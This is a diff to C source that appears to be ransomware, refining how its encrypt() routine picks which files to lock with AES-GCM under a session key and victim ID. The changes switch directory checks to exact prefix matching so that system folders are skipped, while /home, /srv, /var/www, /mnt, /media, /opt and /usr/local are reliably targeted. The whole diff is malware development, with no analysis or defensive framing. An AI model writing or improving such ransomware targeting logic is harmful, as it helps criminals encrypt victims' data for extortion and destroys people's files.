@@ -8,7 +8,7 @@
 #define AES_GCM_TAGLEN 16
 #define BUF_SIZE 4096
 
-const char *systemDir[] = {"/proc", "/sys", "/dev", "/run", "/boot", "/usr", "/bin", "/sbin", "/etc", "/lost+found", "/lib", "/lib64", "/.config"};
+const char *systemDirs[] = {"/proc", "/sys", "/dev", "/run", "/boot", "/bin", "/sbin", "/usr", "/etc", "/lost+found", "/lib", "/lib64", "/.config"};
 const char *targetDirs[] = {"/home", "/srv", "/var/www", "/mnt", "/media", "/opt", "/usr/local"};
 
 int validateFile(const char *filePath)
@@ -186,11 +186,14 @@ void encrypt(const char *filePath)
     }
 
     // Check if the file is in a system directory
-    for (int i = 0; i < sizeof(systemDir) / sizeof(systemDir[0]); i++)
+    for (int i = 0; i < sizeof(systemDirs) / sizeof(systemDirs[0]); i++)
     {
-        if (strstr(filePath, systemDir[i]) != NULL)
+        size_t len = strlen(systemDirs[i]);
+        if (strncmp(filePath, systemDirs[i], len) == 0 && filePath[len] == '/')
         {
-            return;
+            // Exclude /usr/local from system dirs
+            if (strncmp(filePath, "/usr/local", strlen("/usr/local")) != 0)
+                return;
         }
     }
 
@@ -208,7 +211,8 @@ void encrypt(const char *filePath)
 
     for (int i = 0; i < sizeof(targetDirs) / sizeof(targetDirs[0]); i++)
     {
-        if (strstr(filePath, targetDirs[i]) != NULL)
+        size_t len = strlen(targetDirs[i]);
+        if (strncmp(filePath, targetDirs[i], len) == 0 && filePath[len] == '/')
         {
             if (encryptFile(filePath, outfile, sessionKey, victimID) == 0)
             {
